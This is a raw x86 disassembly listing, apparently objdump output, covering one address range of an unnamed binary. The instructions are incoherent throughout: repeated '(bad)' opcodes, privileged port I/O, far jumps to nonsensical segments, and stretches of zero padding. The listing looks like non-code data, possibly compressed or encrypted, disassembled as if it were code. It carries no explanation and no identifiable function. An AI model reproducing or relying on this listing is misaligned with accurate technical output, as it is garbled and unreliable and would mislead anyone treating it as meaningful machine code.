  41c803:	inc    eax
  41c804:	mov    BYTE PTR [esi+eax*8+0x32],cl
  41c808:	adc    ch,BYTE PTR [esp+eiz*8]
  41c80b:	and    BYTE PTR [eax],0xb0
  41c80e:	push   ss
  41c80f:	into   
  41c810:	jo     0x41c81e
  41c812:	mov    eax,0xfceaf078
  41c817:	xchg   ebx,eax
  41c818:	mov    ebx,0x27cd2075
  41c81d:	(bad)  
  41c81e:	je     0x41c7b6
  41c820:	scas   eax,DWORD PTR es:[edi]
  41c821:	mov    al,0xf3
  41c823:	stos   DWORD PTR es:[edi],eax
  41c824:	out    0xd4,al
  41c826:	mov    edx,ecx
  41c828:	xchg   ebx,eax
  41c829:	(bad)  
  41c82a:	cmp    al,0x1f
  41c82c:	jmp    0xe36785b
  41c831:	push   cs
  41c832:	dec    edi
  41c833:	imul   eax,DWORD PTR [esi-0x33],0xffffffbc
  41c837:	dec    ebx
  41c838:	in     al,0x1f
  41c83a:	or     BYTE PTR [ebp-0x491e40cb],bh
  41c840:	dec    ebx
  41c841:	mov    bl,0x62
  41c843:	fnstenv [ecx]
  41c845:	std    
  41c846:	dec    ebx
  41c847:	scas   al,BYTE PTR es:[edi]
  41c848:	(bad)  
  41c849:	daa    
  41c84a:	sbb    al,0x50
  41c84c:	push   edi
  41c84d:	into   
  41c84e:	popf   
  41c84f:	jo     0x41c8c7
  41c851:	dec    edx
  41c852:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c853:	or     DWORD PTR [esi],edi
  41c855:	mov    ds,edi
  41c857:	gs stos BYTE PTR es:[edi],al
  41c859:	or     ecx,DWORD PTR [ebp+0x5431bbdf]
  41c85f:	loope  0x41c888
  41c861:	ss cmp al,0xf6
  41c864:	xor    esp,0xf17bc0ad
  41c86a:	add    al,0x94
  41c86c:	cmp    eax,eax
  41c86e:	mov    ebp,0x3bbbfdd0
  41c873:	mov    ebp,0x76884e87
  41c878:	gs xchg edx,eax
  41c87a:	in     eax,0xb4
  41c87c:	lahf   
  41c87d:	mov    eax,0xce1310e
  41c882:	out    0x5e,eax
  41c884:	lock fdiv QWORD PTR fs:[esi]
  41c888:	shl    BYTE PTR [ebp-0x6bb46882],0xaa
  41c88f:	inc    edx
  41c890:	add    BYTE PTR [eax],0x0
	...
  41c8f3:	add    BYTE PTR [ebx+0x34],ah
  41c8f6:	lods   eax,DWORD PTR ds:[esi]
  41c8f7:	xor    al,0xff
  41c8f9:	mov    ebp,0x291877fb
  41c8fe:	cmp    eax,DWORD PTR [ecx]
  41c900:	pushf  
  41c901:	lods   al,BYTE PTR ds:[esi]
  41c902:	(bad)  
  41c903:	or     BYTE PTR [eax+0x500012f],ch
  41c909:	add    DWORD PTR [eax],eax
  41c90b:	add    BYTE PTR [esi-0x71c6f8b4],cl
  41c911:	push   0xae947f7b
  41c916:	mov    ecx,0xa79f204a
  41c91b:	call   0x1a18:0xfc5da76f
  41c922:	xor    al,0x17
  41c924:	sbb    eax,0x30ca2834
  41c929:	into   
  41c92a:	pop    esp
  41c92b:	jo     0x41c90b
  41c92d:	mov    bh,0x39
  41c92f:	jmp    0x41c906
  41c931:	or     eax,0x814cdcc7
  41c936:	mov    cl,0xca
  41c938:	out    dx,eax
  41c939:	aas    
  41c93a:	fld    TBYTE PTR [ebx]
  41c93c:	mov    ebp,0x1378bdc0
  41c941:	xchg   ecx,eax
  41c942:	lods   al,BYTE PTR ds:[esi]
  41c943:	addr16 xor edi,ecx
  41c946:	cs test al,0x56
  41c949:	or     esp,DWORD PTR [edx+0x12217895]
  41c94f:	sub    al,0x6e
  41c951:	sub    al,0x18
  41c953:	shr    BYTE PTR [edi-0x1],cl
  41c956:	(bad)  
  41c957:	mov    ah,0x73
  41c959:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c95a:	xchg   edx,eax
  41c95b:	and    eax,0x85c1a676
  41c960:	ins    BYTE PTR es:[edi],dx
  41c961:	cld    
  41c962:	add    cl,BYTE PTR ds:0x7539fcab
  41c968:	mov    edi,0xe6d261d1
  41c96d:	sar    edx,0xb2
  41c970:	xor    DWORD PTR [ecx],0xd
  41c973:	(bad)  
  41c974:	and    eax,0xaadba29e
  41c979:	push   ecx
  41c97a:	pop    ebx
  41c97b:	inc    eax
  41c97c:	leave  
  41c97d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c97e:	repnz mov dl,0xe1
  41c981:	and    BYTE PTR [edx],ah
  41c983:	mov    bl,cl
  41c985:	or     DWORD PTR [edi-0x13],0xffffffbb
  41c989:	cmp    al,0xca
  41c98b:	jns    0x41c9d1
  41c98d:	icebp  
  41c98e:	adc    bh,BYTE PTR [edx+0x43]
  41c991:	jne    0x41c951
  41c993:	dec    ecx
  41c994:	nop
  41c995:	stos   BYTE PTR es:[edi],al
  41c996:	pop    edi
  41c997:	test   BYTE PTR gs:[edx-0x21],al
  41c99b:	enter  0xd547,0x24
  41c99f:	pop    eax
  41c9a0:	dec    esp
  41c9a1:	xchg   edi,eax
  41c9a2:	inc    eax
  41c9a3:	pop    ss
  41c9a4:	pop    esi
  41c9a5:	idiv   DWORD PTR [esi+0x654a243]
  41c9ab:	out    0x43,eax
  41c9ad:	jb     0x41c988
  41c9af:	pop    eax
  41c9b0:	jns    0x41c9e0
  41c9b2:	ficom  WORD PTR [ecx-0x31]
  41c9b5:	mov    ds:0xec05892a,al
  41c9ba:	retf   
  41c9bb:	jae    0x41c969
  41c9bd:	loope  0x41c9d7
  41c9bf:	imul   edi,ebp,0x23
  41c9c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c9c3:	push   ss
  41c9c4:	fdivr  QWORD PTR [ecx*1-0x4d442b80]
  41c9cb:	cmp    bl,BYTE PTR [ebx-0x2f892778]
  41c9d1:	push   cs
  41c9d2:	dec    eax
  41c9d3:	jge    0x41c9b0
  41c9d5:	call   0x8b497844
  41c9da:	lahf   
  41c9db:	sar    DWORD PTR [ebp+0x2],1
  41c9de:	or     BYTE PTR [ebp-0x5a5ec0e2],cl
  41c9e4:	test   ebp,eax
  41c9e6:	scas   eax,DWORD PTR es:[edi]
  41c9e7:	js     0x41ca3c
  41c9e9:	jge    0x41ca14
  41c9eb:	adc    DWORD PTR [eax],0x7c
  41c9ee:	mov    ds:0x75e0fe4c,eax
  41c9f3:	lahf   
  41c9f4:	out    0xf1,eax
  41c9f6:	jmp    0x41c9e1
  41c9f8:	test   edi,ecx
  41c9fa:	cmp    DWORD PTR [ebx+esi*1+0x1b],ecx
  41c9fe:	mov    ebp,0x4c8ed142
  41ca03:	xchg   BYTE PTR [eax],al
  41ca05:	push   eax
  41ca06:	in     al,0x47
  41ca08:	aad    0x42
  41ca0a:	adc    dl,BYTE PTR [edi+0x4ea5d98f]
  41ca10:	or     BYTE PTR [eax],al
	...
  41ca72:	add    BYTE PTR [eax],al
  41ca74:	lock retf 0xfc94
  41ca78:	mov    esi,0xc1cef8fe
  41ca7d:	or     al,BYTE PTR [ebx+0x0]
  41ca80:	dec    eax
  41ca81:	in     al,dx
  41ca82:	push   0x130ad60
  41ca87:	add    BYTE PTR ds:0xb9000001,al
  41ca8d:	sbb    al,0x1c
  41ca8f:	push   0xb1673d3d
  41ca94:	lea    edi,[esi+0x68]
  41ca97:	push   ebp
  41ca98:	mov    esp,0xf1b9b401
  41ca9d:	cdq    
  41ca9e:	lahf   
  41ca9f:	fdiv   QWORD PTR [esi+0x48ae93df]
  41caa5:	mov    fs,WORD PTR [eax+0x5f]
  41caa8:	inc    edi
  41caa9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41caaa:	addr16 mov bl,0xf1
  41caad:	fwait
  41caae:	int3   
  41caaf:	outs   dx,BYTE PTR ds:[esi]
  41cab0:	sbb    eax,DWORD PTR fs:[edi+edx*4-0x1e44ce23]
  41cab8:	jle    0x41cabd
  41caba:	jb     0x41cb13
  41cabc:	add    eax,0xb867be70
  41cac1:	je     0x41cacc
  41cac3:	mov    al,0xff
  41cac5:	sub    eax,0xbad006a7
  41caca:	add    DWORD PTR ds:0xce33b168,0x5e
  41cad1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cad2:	mov    dl,0x91
  41cad4:	cs ret 
  41cad6:	shl    DWORD PTR [edi+edx*2+0x75],1
  41cada:	adc    DWORD PTR [ecx],ecx
  41cadc:	push   edi
  41cadd:	repnz adc BYTE PTR [esi],dh
  41cae0:	jmp    0x3598:0x2aeaba99
  41cae7:	loope  0x41cb52
  41cae9:	sub    BYTE PTR [esi],dl
  41caeb:	std    
  41caec:	dec    esp
  41caed:	xor    DWORD PTR ds:0x9d80d1fd,eax
  41caf3:	inc    ebp
  41caf4:	cmp    al,0xe
  41caf6:	xor    DWORD PTR [ecx-0x4e],0x10
  41cafa:	mov    al,0x2b
  41cafc:	sub    DWORD PTR [ecx-0x55],ebp
  41caff:	loop   0x41cb6c
  41cb01:	iret   
  41cb02:	jns    0x41cadd
  41cb04:	dec    esp
  41cb05:	test   DWORD PTR [edx-0x60],esp
  41cb08:	into   
  41cb09:	adc    esi,DWORD PTR [ecx]
  41cb0b:	not    BYTE PTR [ebx+0x3e5a9bdb]
  41cb11:	(bad)  
  41cb12:	xchg   ebp,eax
  41cb13:	test   eax,0x26970b8b
  41cb18:	sub    dl,BYTE PTR [edx+eiz*2-0x6b460743]
  41cb1f:	cmp    eax,0x885288bf
  41cb24:	xchg   esi,eax
  41cb25:	das    
  41cb26:	(bad)  
  41cb27:	cwde   
  41cb28:	inc    ebp
  41cb29:	or     BYTE PTR [ecx-0x2a993753],dl
  41cb2f:	mov    ch,0x80
  41cb31:	fwait
  41cb32:	jmp    DWORD PTR [ecx+0xb119a6e]
  41cb38:	icebp  
  41cb39:	add    al,0x82
  41cb3b:	cmp    ecx,esp
  41cb3d:	call   0xf191dd5e
  41cb42:	ror    BYTE PTR ss:[ebx-0x1ed0551b],1
  41cb49:	xor    BYTE PTR [edx-0x507ad6fc],ah
  41cb4f:	sbb    DWORD PTR [esi-0x8f2864a],esi
  41cb55:	sahf   
  41cb56:	je     0x41cb89
  41cb58:	imul   edx,ecx,0xffffffed
  41cb5b:	sbb    DWORD PTR [ebp-0x5683814d],esp
  41cb61:	ror    BYTE PTR [ebp+esi*8+0xa],cl
  41cb65:	inc    edi
  41cb66:	cmp    cl,BYTE PTR [ebx]
  41cb68:	xchg   esp,eax
  41cb69:	pop    ebx
  41cb6a:	cld    
  41cb6b:	stos   DWORD PTR es:[edi],eax
  41cb6c:	or     al,0xcb
  41cb6f:	inc    eax
  41cb70:	pop    ecx
  41cb71:	test   DWORD PTR [ecx],ecx
  41cb73:	addr16 pop ebx
  41cb75:	retf   
  41cb76:	push   0xb919fc5d
  41cb7b:	push   ss
  41cb7c:	sub    dl,dh
  41cb7e:	or     eax,0xf9c0c85e
  41cb83:	jno    0x41cb70
  41cb85:	or     cl,BYTE PTR ss:[esp+esi*8+0x3c882cfd]
  41cb8d:	push   ebp
  41cb8e:	mov    bh,0xdc
  41cb90:	dec    esi
	...
  41cbf1:	add    BYTE PTR [eax],al
  41cbf3:	add    BYTE PTR [ecx],ch
  41cbf5:	(bad)  
  41cbf6:	sti    
  41cbf7:	pop    ebp
  41cbf8:	(bad)  
  41cbf9:	jge    0x41cbaa
  41cbfb:	neg    cl
  41cbfd:	hlt    
  41cbfe:	add    eax,0x52a81022
  41cc03:	pop    ecx
  41cc04:	mov    dl,0x31
  41cc06:	add    DWORD PTR [eax],eax
  41cc08:	add    eax,0xc000001
  41cc0d:	cwde   
  41cc0e:	pushf  
  41cc0f:	cwde   
  41cc10:	enter  0x8d4f,0x50
  41cc14:	(bad)  
  41cc15:	jnp    0x41cc32
  41cc17:	mov    ebx,0x2cd8f02b
  41cc1c:	not    DWORD PTR ds:0xb07fbf2e
  41cc22:	dec    ebx
  41cc23:	lea    edx,[ebx]
  41cc25:	mov    ds:0xa68f8c50,al
  41cc2a:	jl     0x41cc9d
  41cc2c:	in     eax,dx
  41cc2d:	addr16 mov cl,0x39
  41cc30:	in     eax,dx
  41cc31:	rol    BYTE PTR ss:[ebp-0x3e],0xa5
  41cc36:	mov    al,ds:0x700ccf38
  41cc3b:	mov    ds:0xc31a84,eax
  41cc40:	pop    eax
  41cc41:	icebp  
  41cc42:	(bad)  
  41cc43:	stos   BYTE PTR es:[edi],al
  41cc44:	and    al,0xa6
  41cc46:	leave  
  41cc47:	adc    BYTE PTR [ebx-0x40],al
  41cc4a:	cs mov bh,0x5e
  41cc4d:	(bad)  
  41cc4e:	(bad)  [ebx]
  41cc50:	out    0x50,eax
  41cc52:	jno    0x41ccc2
  41cc54:	mov    cl,0x96
  41cc56:	pop    ss
  41cc57:	lahf   
  41cc58:	setge  BYTE PTR [eax-0xd]
  41cc5c:	rcl    DWORD PTR [ecx],1
  41cc5e:	nop
  41cc5f:	stc    
  41cc60:	push   0x75
  41cc62:	jae    0x41cbfc
  41cc64:	pop    eax
  41cc65:	fidivr DWORD PTR [ebp-0x67]
  41cc68:	push   esi
  41cc69:	inc    esi
  41cc6a:	cmc    
  41cc6b:	xor    edx,DWORD PTR [ebp-0x24]
  41cc6e:	jmp    0x41cc3d
  41cc70:	ret    0xb291
  41cc73:	cmp    eax,0xd84ff8f7
  41cc78:	rcr    DWORD PTR [edx-0x15],cl
  41cc7b:	sbb    BYTE PTR [ebx],dl
  41cc7d:	les    esi,FWORD PTR [ecx]
  41cc7f:	push   eax
  41cc80:	sbb    edx,DWORD PTR [ebp+0x5]
  41cc83:	inc    esi
  41cc84:	add    bh,bh
  41cc86:	jns    0x41cc86
  41cc88:	cmc    
  41cc89:	ret    
  41cc8a:	mul    DWORD PTR [ebx+eax*8]
  41cc8d:	mov    bh,0x1a
  41cc8f:	lods   al,BYTE PTR ds:[esi]
  41cc90:	add    edi,DWORD PTR [ebp-0x17]
  41cc93:	dec    esi
  41cc94:	add    al,0x11
  41cc96:	inc    BYTE PTR [edx-0x7c]
  41cc99:	cs ja  0x41cd1b
  41cc9c:	mov    al,0xc8
  41cc9e:	or     DWORD PTR [eax+0xd],0x4c6b3685
  41cca5:	adc    al,0x6f
  41cca7:	push   edx
  41cca8:	test   DWORD PTR [ebp+0x2a],0x81581d63
  41ccaf:	out    0xf,eax
  41ccb1:	sbb    BYTE PTR [ebp-0x40],0xa4
  41ccb5:	js     0x41ccd8
  41ccb7:	push   edx
  41ccb8:	lock daa 
  41ccba:	(bad)  
  41ccbb:	sahf   
  41ccbc:	cld    
  41ccbd:	data16 mov al,ds:0xf7a76c95
  41ccc3:	data16 loopne 0x41cc85
  41ccc6:	scas   eax,DWORD PTR es:[edi]
  41ccc7:	mov    al,ds:0xa13fb7f0
  41cccc:	jmp    0xaab885aa
  41ccd1:	jmp    0xc31f:0x85d214dd
  41ccd8:	aam    0x92
  41ccda:	cmp    al,0x93
  41ccdc:	sub    bh,BYTE PTR [ebp+0x2a]
  41ccdf:	pop    edx
  41cce0:	pusha  
  41cce1:	es dec ebp
  41cce3:	mov    ecx,0x24cf06a2
  41cce8:	nop
  41cce9:	mov    eax,ds:0xad12b6d3
  41ccee:	push   0xffffffd5
  41ccf0:	dec    ebp
  41ccf1:	sbb    eax,0x49f4faad
  41ccf6:	jp     0x41cca7
  41ccf8:	fisttp WORD PTR [esi+edx*8]
  41ccfb:	push   ebp
  41ccfc:	shr    DWORD PTR [ebx-0x3cfa8f7d],1
  41cd02:	and    eax,0xabebd8e7
  41cd07:	mov    BYTE PTR [ecx+eiz*1-0x51],cl
  41cd0b:	sar    DWORD PTR [esp+esi*1+0x15c277],1
	...
  41cd72:	add    BYTE PTR [eax],al
  41cd74:	pusha  
  41cd75:	cdq    
  41cd76:	fsubr  st(5),st
  41cd78:	std    
  41cd79:	in     eax,0x79
  41cd7b:	popf   
  41cd7c:	in     al,dx
  41cd7d:	stc    
  41cd7e:	jmp    0x41cdb0
  41cd80:	jmp    0x41cd46
  41cd82:	cmp    eax,0x132b7f6
  41cd87:	add    BYTE PTR ds:0x83000001,al
  41cd8d:	retf   0x3d61
  41cd90:	repnz sub al,BYTE PTR [esi-0x2c]
  41cd94:	pop    ecx
  41cd95:	push   esp
  41cd96:	cdq    
  41cd97:	push   cs
  41cd98:	push   eax
  41cd99:	leave  
  41cd9a:	push   ss
  41cd9b:	push   ss
  41cd9c:	(bad)  
  41cd9d:	sahf   
  41cd9e:	mov    ch,al
  41cda0:	sub    cl,BYTE PTR [edi-0x68]
  41cda3:	xchg   edi,eax
  41cda4:	pop    ecx
  41cda5:	jb     0x41cd62
  41cda7:	mov    dh,0x6b
  41cda9:	xchg   esp,eax
  41cdaa:	in     eax,0x22
  41cdac:	dec    edi
  41cdad:	inc    ebp
  41cdae:	and    al,0x28
  41cdb0:	push   ds
  41cdb1:	jge    0x41cdef
  41cdb3:	mov    al,0xc5
  41cdb5:	ficom  DWORD PTR [edx+esi*2+0x40]
  41cdb9:	fxch   st(2)
  41cdbb:	jge    0x41cdd1
  41cdbd:	push   edi
  41cdbe:	out    dx,eax
  41cdbf:	dec    ebx
  41cdc0:	lock xchg BYTE PTR ss:[ecx+0x31],dh
  41cdc5:	mov    ?,WORD PTR [eax]
  41cdc7:	pushf  
  41cdc8:	fisttp DWORD PTR [ebx+ebx*8]
  41cdcb:	xchg   ecx,eax
  41cdcc:	or     BYTE PTR [edx-0x2c],0x7b
  41cdd0:	pop    ds
  41cdd1:	pop    eax
  41cdd2:	popf   
  41cdd3:	add    eax,0x5b1ad8db
  41cdd8:	push   eax
  41cdd9:	mov    ebx,0xaa0fcf30
  41cdde:	push   edx
  41cddf:	aaa    
  41cde0:	test   BYTE PTR [ebp+0x74],cl
  41cde3:	call   0xecc42197
  41cde8:	iret   
  41cde9:	sbb    esi,DWORD PTR [ebp+0x6a347f7b]
  41cdef:	retf   0x9749
  41cdf2:	or     edx,DWORD PTR [edx]
  41cdf4:	test   al,0x42
  41cdf6:	call   0xdf53bb93
  41cdfb:	ins    DWORD PTR es:[edi],dx
  41cdfc:	jp     0x41ce6c
  41cdfe:	inc    edx
  41cdff:	rcr    al,1
  41ce01:	xchg   ebx,eax
  41ce02:	and    BYTE PTR [edx+0x60],al
  41ce05:	and    al,0xfb
  41ce07:	push   ebp
  41ce08:	cmp    BYTE PTR [esi-0x7c],ch
  41ce0b:	mov    edx,edi
  41ce0d:	(bad)  
  41ce0e:	sbb    BYTE PTR [edi+0x25],ah
  41ce11:	or     bh,ch
  41ce13:	das    
  41ce14:	xchg   ebx,eax
  41ce15:	test   eax,0x9bb1ac4b
  41ce1a:	xor    esp,DWORD PTR [esi-0x35]
  41ce1d:	stc    
  41ce1e:	div    BYTE PTR [esi+edi*8+0x44987b4b]
  41ce25:	pop    ds
  41ce26:	inc    ecx
  41ce27:	jae    0x41cdbc
  41ce29:	and    BYTE PTR [edi-0x65],bh
  41ce2c:	popa   
  41ce2d:	call   0x239e:0x637af727
  41ce34:	jbe    0x41ce0c
  41ce36:	mov    esp,0xa630c871
  41ce3b:	popf   
  41ce3c:	call   0xd6b888fe
  41ce41:	push   ss
  41ce42:	loope  0x41ce61
  41ce44:	call   0x4b4f31ff
  41ce49:	or     al,0xbe
  41ce4b:	and    esp,DWORD PTR [esp+esi*4-0x13]
  41ce4f:	(bad)  
  41ce50:	scas   al,BYTE PTR es:[edi]
  41ce51:	pushf  
  41ce52:	inc    esi
  41ce53:	sub    eax,0x417791cb
  41ce58:	add    DWORD PTR ds:0xcb1aeca9,ebp
  41ce5e:	pop    edi
  41ce5f:	lea    ebx,[ebx-0x1a]
  41ce62:	push   ebp
  41ce63:	retf   0x82ed
  41ce66:	or     cl,bl
  41ce68:	das    
  41ce69:	leave  
  41ce6a:	jecxz  0x41ce28
  41ce6c:	rol    DWORD PTR [edi],cl
  41ce6e:	ss pop ecx
  41ce70:	call   0x851c:0x4ff9c8ac
  41ce77:	mov    eax,ds:0xf1b7a937
  41ce7c:	fwait
  41ce7d:	inc    esi
  41ce7e:	mov    cl,0xb1
  41ce80:	mov    ecx,0xc06f6e85
  41ce85:	jo     0x41ce6e
  41ce87:	aam    0x26
  41ce89:	push   esi
  41ce8a:	(bad)  [edx]
  41ce8c:	nop
  41ce8d:	dec    ebx
  41ce8e:	sub    ah,ah
  41ce90:	and    DWORD PTR [eax],eax
	...
  41cef2:	add    BYTE PTR [eax],al
  41cef4:	pop    es
  41cef5:	jp     0x41cedf
  41cef7:	jnp    0x41cef6
  41cef9:	sti    
  41cefa:	xchg   edi,eax
  41cefb:	jle    0x41cf44
  41cefd:	jp     0x41ced9
  41ceff:	lods   al,BYTE PTR ds:[esi]
  41cf00:	jecxz  0x41cf00
  41cf02:	mov    ah,0xc6
  41cf04:	mov    esp,0x5000133
  41cf09:	add    DWORD PTR [eax],eax
  41cf0b:	add    BYTE PTR [edx-0x4ecc388c],al
  41cf11:	sar    BYTE PTR [ecx-0x7],0x81
  41cf15:	das    
  41cf16:	mov    eax,ds:0x6c0115c7
  41cf1b:	cmp    BYTE PTR [ebx-0x42],ch
  41cf1e:	cmp    BYTE PTR [ecx-0x690cdee5],ah
  41cf24:	mov    esi,DWORD PTR [edi+0x6a]
  41cf27:	adc    DWORD PTR [edi+0x6d],ebx
  41cf2a:	gs pop edx
  41cf2c:	jo     0x41cf86
  41cf2e:	jae    0x41cfaf
  41cf30:	add    DWORD PTR [edx+ecx*1+0x69],edi
  41cf34:	and    DWORD PTR [edx+0x17b72d49],esp
  41cf3a:	dec    edx
  41cf3b:	lock pop es
  41cf3d:	pop    esp
  41cf3e:	xor    al,0x13
  41cf40:	sub    edi,DWORD PTR [eax+0x1]
  41cf43:	pop    ebx
  41cf44:	sar    BYTE PTR [esp+eax*4-0x7f75c0d4],0x11
  41cf4c:	jb     0x41cfb0
  41cf4e:	and    edi,esp
  41cf50:	and    eax,DWORD PTR [edx]
  41cf52:	xor    BYTE PTR [ebx-0x9da1138],dh
  41cf58:	mov    dl,0xb3
  41cf5a:	cmp    DWORD PTR [edx+0x5d],ebx
  41cf5d:	shl    DWORD PTR [esi+0x5e9b2f03],0x3
  41cf64:	dec    esi
  41cf65:	jge    0x41cf64
  41cf67:	and    DWORD PTR [edi],ebp
  41cf69:	out    0x13,eax
  41cf6b:	(bad)  
  41cf6c:	loope  0x41cfe1
  41cf6e:	sbb    al,0xe2
  41cf70:	popf   
  41cf71:	jp     0x41cfa6
  41cf73:	call   0xaa2d:0xd9da0b5c
  41cf7a:	daa    
  41cf7b:	ins    BYTE PTR es:[edi],dx
  41cf7c:	and    al,0x54
  41cf7e:	jnp    0x41cf3d
  41cf80:	pop    edx
  41cf81:	sahf   
  41cf82:	pop    ebx
  41cf83:	pusha  
  41cf84:	int3   
  41cf85:	inc    esp
  41cf86:	pop    ds
  41cf87:	nop
  41cf88:	out    0x11,al
  41cf8a:	test   al,0x68
  41cf8c:	sahf   
  41cf8d:	mov    WORD PTR ss:[edi-0xe],fs
  41cf91:	cmp    eax,0x57719020
  41cf96:	pop    ecx
  41cf97:	rcl    BYTE PTR [ecx-0x19],0x56
  41cf9b:	xchg   BYTE PTR [esi-0x70f36377],ch
  41cfa1:	in     al,0x84
  41cfa3:	xchg   edx,eax
  41cfa4:	mov    bl,0xbd
  41cfa6:	cmc    
  41cfa7:	pop    ebx
  41cfa8:	adc    BYTE PTR [ecx+0x7d],dl
  41cfab:	mov    ecx,0x27c9c5ba
  41cfb0:	jg     0x41cff2
  41cfb2:	imul   ebp,DWORD PTR [ecx-0x58],0xc7ac12a1
  41cfb9:	rol    esi,0xdb
  41cfbc:	pop    ebp
  41cfbd:	adc    dh,BYTE PTR [eax+0x37]
  41cfc0:	cld    
  41cfc1:	mov    al,0x4
  41cfc3:	mov    esp,0xa469f66f
  41cfc8:	xchg   ebx,eax
  41cfc9:	cdq    
  41cfca:	cmp    DWORD PTR [edx+0x374bcdd0],esi
  41cfd0:	pop    ss
  41cfd1:	(bad)  
  41cfd2:	adc    BYTE PTR [ecx-0x7b824616],dh
  41cfd8:	sub    DWORD PTR [edi+ecx*1],0x4d0c71c5
  41cfdf:	sub    al,0x45
  41cfe2:	cmp    al,0x2c
  41cfe4:	dec    eax
  41cfe5:	push   0xa9dd56c8
  41cfea:	arpl   WORD PTR [eax-0x76],dx
  41cfed:	and    eax,ebx
  41cfef:	addr16 sti 
  41cff1:	fistp  WORD PTR [eax-0x24e21b58]
  41cff7:	out    dx,eax
  41cff8:	mov    WORD PTR ds:0x30f437da,?
  41cffe:	popf   
  41cfff:	cld    
  41d000:	call   0x5a2e6e9c
  41d005:	xor    bl,ch
  41d007:	mov    eax,ds:0x80e92246
  41d00c:	ret    
  41d00d:	sbb    bl,BYTE PTR [ebx+0xf6cf]
	...
  41d073:	add    BYTE PTR [ecx-0x52bcdfcc],bh
  41d079:	push   edi
  41d07a:	sti    
  41d07b:	dec    BYTE PTR [esi-0x1b]
  41d07e:	mov    ebp,0xcf0162bd
  41d083:	xadd   DWORD PTR [ecx+eax*1],esi
  41d087:	add    BYTE PTR ds:0x2b000001,al
  41d08d:	add    eax,0x3278a646
  41d092:	ds push 0x8390102d
  41d098:	sub    esi,ebx
  41d09a:	fwait
  41d09b:	mov    edi,0x84c5a80f
  41d0a0:	mov    edx,0x80dcb58a
  41d0a5:	mov    ebx,0xf5cec55a
  41d0aa:	cmp    ecx,DWORD PTR ds:0x14869a0a
  41d0b0:	ret    
  41d0b1:	mov    WORD PTR [edi+0x7a3f7e2d],fs
  41d0b7:	(bad)  
  41d0b8:	mov    ebx,0xc83b3a2d
  41d0bd:	test   BYTE PTR [esp-0x48],cl
  41d0c1:	add    bh,BYTE PTR [esi-0x5b]
  41d0c4:	pop    esi
  41d0c5:	adc    esp,DWORD PTR [ebp+0x4b]
  41d0c8:	lods   eax,DWORD PTR ds:[esi]
  41d0c9:	dec    ebp
  41d0ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d0cb:	xchg   ebp,eax
  41d0cc:	nop
  41d0cd:	cdq    
  41d0ce:	sub    eax,0xa6bbf77c
  41d0d3:	sub    DWORD PTR [eax],esi
  41d0d5:	lods   eax,DWORD PTR ds:[esi]
  41d0d6:	xchg   ebx,eax
  41d0d7:	jmp    FWORD PTR [edx]
  41d0d9:	jns    0x41d149
  41d0db:	adc    BYTE PTR [esi+0x5c],0xc0
  41d0df:	test   al,0x22
  41d0e1:	mov    edx,0xb2094889
  41d0e6:	and    DWORD PTR [eax+edx*1+0x65758812],0xe6293c4
  41d0f1:	pop    ebx
  41d0f2:	out    dx,al
  41d0f3:	dec    esp
  41d0f4:	inc    esp
  41d0f5:	nop
  41d0f6:	mov    ecx,0xba98a4ff
  41d0fb:	push   ds
  41d0fc:	or     BYTE PTR [eax+0x53dcbc9f],0x6a
  41d103:	mov    ch,0x33
  41d105:	push   cs
  41d106:	sahf   
  41d107:	icebp  
  41d108:	out    dx,al
  41d109:	mov    dl,0xf7
  41d10b:	xchg   edx,eax
  41d10c:	int3   
  41d10d:	cli    
  41d10e:	cwde   
  41d10f:	js     0x41d0f5
  41d111:	inc    ecx
  41d112:	jmp    0xa8cf:0xab556535
  41d119:	out    dx,eax
  41d11a:	loope  0x41d15b
  41d11c:	jne    0x41d0bc
  41d11e:	jg     0x41d0f7
  41d120:	cmp    DWORD PTR [edx-0x5735af6c],ebp
  41d126:	ror    DWORD PTR [edx+0x77],1
  41d129:	and    dh,BYTE PTR [ebp+0x6c]
  41d12c:	add    al,0x32
  41d12e:	mov    ds:0x273c4543,eax
  41d133:	jmp    0xfc8f:0x9a1651f8
  41d13a:	scas   al,BYTE PTR es:[edi]
  41d13b:	or     ecx,DWORD PTR [ebp+ebx*2+0x2e0e7dcb]
  41d142:	mov    BYTE PTR ds:0x326cee72,dl
  41d148:	add    al,0xaf
  41d14a:	add    cl,dh
  41d14c:	sbb    BYTE PTR [esp+eiz*8-0x64521bd4],0x94
  41d154:	sub    al,0x49
  41d156:	sbb    DWORD PTR [ecx-0x41],0xf38f07a6
  41d15d:	cdq    
  41d15e:	xor    ecx,esp
  41d160:	sub    ebp,DWORD PTR [eax+0x6491246b]
  41d166:	das    
  41d167:	icebp  
  41d168:	push   edx
  41d169:	or     esi,DWORD PTR [edi-0x31e2b8c9]
  41d16f:	mov    bh,0x75
  41d171:	shl    DWORD PTR [ecx-0x535dc080],0xe6
  41d178:	pop    es
  41d179:	scas   eax,DWORD PTR es:[edi]
  41d17a:	xor    DWORD PTR [ebx+0x1a108e49],ecx
  41d180:	sti    
  41d181:	mov    al,dh
  41d183:	and    bh,BYTE PTR [edi+0x20cd54b0]
  41d189:	out    0xc2,eax
  41d18b:	xor    BYTE PTR [ecx-0x7c78398d],al
	...
  41d1f1:	add    BYTE PTR [eax],al
  41d1f3:	add    BYTE PTR [eax-0x3d],dl
  41d1f6:	cmp    ecx,DWORD PTR ds:0xdf76fdbb
  41d1fc:	xor    DWORD PTR [ebp-0x7],esp
  41d1ff:	hlt    
  41d200:	mov    ds:0xc6ae4d0d,eax
  41d205:	xor    eax,0x1050001
  41d20a:	add    BYTE PTR [eax],al
  41d20c:	sub    DWORD PTR [esi+0x65],eax
  41d20f:	fiadd  DWORD PTR [edi+0x4a4379ca]
  41d215:	in     eax,0x2e
  41d217:	test   DWORD PTR [eax+ebx*1-0x2d],edx
  41d21b:	xor    eax,0xd7c76f9d
  41d220:	hlt    
  41d221:	pop    ecx
  41d222:	push   ebx
  41d223:	cmp    BYTE PTR [eax+ecx*4],dh
  41d226:	(bad)  
  41d228:	inc    esp
  41d229:	cmp    edx,edx
  41d22b:	push   es
  41d22c:	out    dx,al
  41d22d:	jge    0x41d2a2
  41d22f:	retf   0x5776
  41d232:	sahf   
  41d233:	inc    ebx
